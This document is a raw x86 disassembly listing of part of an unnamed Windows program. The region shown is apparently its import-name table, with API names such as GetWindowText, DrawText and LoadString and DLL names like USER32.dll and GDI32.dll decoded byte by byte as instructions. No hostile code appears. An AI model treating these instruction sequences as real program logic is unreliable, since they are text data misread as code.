  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
